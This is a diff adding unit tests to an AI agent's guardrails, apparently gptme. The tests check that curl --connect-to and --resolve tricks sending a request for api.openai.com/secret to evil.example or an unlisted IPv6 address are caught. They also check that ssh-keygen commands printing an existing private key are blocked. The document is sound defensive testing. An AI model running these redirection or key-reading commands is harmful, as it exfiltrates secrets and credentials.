@@ -236,6 +236,35 @@ class TestEgressAllowlist:
         assert result is not None
         assert "evil.example" in result
 
+    def test_curl_connect_to_ipv6_source_uses_dest_host(self):
+        # First bracketed field is the *source* host; dest is evil.example.
+        result = _check_egress(
+            "curl --connect-to [::1]:443:evil.example:443 "
+            "https://api.openai.com/secret",
+            allowlist=["::1", "api.openai.com"],
+        )
+        assert result is not None
+        assert "evil.example" in result
+
+    def test_curl_connect_to_ipv6_dest_allowlisted(self):
+        assert (
+            _check_egress(
+                "curl --connect-to api.openai.com:443:[::1]:443 "
+                "https://api.openai.com/secret",
+                allowlist=["::1", "api.openai.com"],
+            )
+            is None
+        )
+
+    def test_curl_resolve_ipv6_dest_blocked(self):
+        result = _check_egress(
+            "curl --resolve api.openai.com:443:[2001:db8::1] "
+            "https://api.openai.com/secret",
+            allowlist=["api.openai.com"],
+        )
+        assert result is not None
+        assert "2001:db8::1" in result
+
     def test_curl_resolve_equals_form_blocked(self):
         result = _check_egress(
             "curl --resolve=api.openai.com:443:1.2.3.4 https://api.openai.com/secret",
@@ -455,6 +484,27 @@ class TestGuardrailsHook:
         result = guardrails_hook(tu)
         assert isinstance(result, ConfirmationResult)
         assert result.action == ConfirmAction.SKIP
+
+    def test_ssh_keygen_print_existing_key_blocked(self, monkeypatch):
+        # `-y` reads a private key; the generate-key skip must not apply.
+        monkeypatch.setenv("GPTME_GUARDRAILS", "enforce")
+        tu = self._tool_use("shell", "ssh-keygen -y -f existing.key")
+        result = guardrails_hook(tu)
+        assert isinstance(result, ConfirmationResult)
+        assert result.action == ConfirmAction.SKIP
+
+    def test_ssh_keygen_clustered_yf_blocked(self, monkeypatch):
+        monkeypatch.setenv("GPTME_GUARDRAILS", "enforce")
+        tu = self._tool_use("shell", "ssh-keygen -yf existing.key")
+        result = guardrails_hook(tu)
+        assert isinstance(result, ConfirmationResult)
+        assert result.action == ConfirmAction.SKIP
+
+    def test_ssh_keygen_generate_key_file_allowed(self, monkeypatch):
+        monkeypatch.setenv("GPTME_GUARDRAILS", "enforce")
+        tu = self._tool_use("shell", "ssh-keygen -t rsa -f server.key -N ''")
+        result = guardrails_hook(tu)
+        assert result is None
 
     def test_shell_grep_pem_blocked(self, monkeypatch):
         monkeypatch.setenv("GPTME_GUARDRAILS", "enforce")
